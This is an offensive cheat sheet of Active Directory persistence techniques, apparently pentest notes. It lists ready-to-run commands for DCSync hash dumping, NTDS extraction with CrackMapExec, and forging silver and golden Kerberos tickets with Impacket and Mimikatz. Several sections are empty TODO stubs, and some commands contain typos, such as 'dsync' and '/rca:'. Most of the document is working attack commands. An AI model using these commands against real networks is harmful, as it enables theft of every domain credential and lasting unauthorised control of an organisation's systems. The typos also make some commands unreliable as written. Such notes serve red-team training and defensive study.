# Persistence

## Understanding Domain Persistence

## Dcsync Attack

If we have valid credentials for a user and this user has the  `GetChanges` and  `GetChangesAll` privileges over the domain, we can execute an attack named `DCSync`. This attack will allow us to display the `NTLM` hashes of all the users of the domain. Remember that this `NTLM` hashes can be used for the `PassTheHash` technique. To do this:

```bash
secretsdump.py -dc-ip 10.10.10.1 domain.local/user:password@10.10.10.1
```

### Mimikatz

The same process can be done connecting to any machine of the domain, having valid credentials and using `Mimikatz`, to do this:

```powershell
lsadump::dsync /domain:domain.local /user:Administrator
```

## DSRM and DCshadow Attacks

## ADCS Attacks

## Dump NTDS

Once we have valid `Administrator` credentials on the `DC`, we can dump the `NTDS` file. This file has all the users and `NTLM` hashes of the domain:

```bash
cme smb 10.10.10.1 -u 'Administrator' -p 'password' --ntds vss
```

We can later use all this hashes to do `PassTheHash`.

## Silver Ticket Attack

TODO

Get Hash and SPN

```bash
impacket-GetUsersSPNs -request -dc-ip dc1.domain.local domain.local/user:pass
```

Crack Hash

Get SID

```bash
impacket-lookupsid user:password@dc1.domain.local
```

Convert Password to NTLM

```bash
iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
```

Create Silver Ticket as Admin

```bash
impacket-ticketer -domain-sid {SID} -spn MSSQLSvc/dc1.domain.local:1433 -domain domain.local -dc-ip dc1.domain.local -nthash {NTLM} Administrator
```

Once we have the `Administrator.ccache` file, we can use it to do `Pass the Hash` to the `SPN`.

## Golden Ticket Attack

TODO

### Impacket

KRBTGT NT HASH

```bash
impacket-secretsdump.py Administrator:password@dc1.domain.local
```

Get SID

```bash
impacket-lookupsid Administrator:password@dc1.domain.local
```

Convert Password to NTLM

```bash
iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
```

Create Golden Ticket

```bash
impacket-ticketer -domain-sid {SID} -domain domain.local -dc-ip dc1.domain.local -nthash {NTLM} baduser
```

### Mimikatz
Once we have the `Mimikatz` binary in the target machine, we can dump the information of the  `krbtgt` user to create a `Golden Ticket`. We will use the following command:

```powershell
lsadump::lsa /inject /name:krbtgt
```

We will copy this information to a file, as it has some parameters that we need to create the `Golden Ticket`. Then, we will create the `Golden Ticket` with the following command:

```powershell
kerberos::golden /domain:domain.local /sid: {SID} /rca:{NTLM HASH} /user:Administrator /ticket:golden.kirbi
```

This will generate a `golden.kirbi` file that has the mentioned `Golden Ticket`.

We can convert this ticket in `.kirbi` format to a `.ccache` ticket that we can use in Linux:

```bash
impacket-ticketConverter golden.kirbi golden.ccache 
```

Once we have the `.ccache` file, we can use it to do `Pass the Ticket` to all services in the domain as all users.

Using a `Golden Ticket` allows us to connect to the `DC` even if `Administrator` changes his user password.
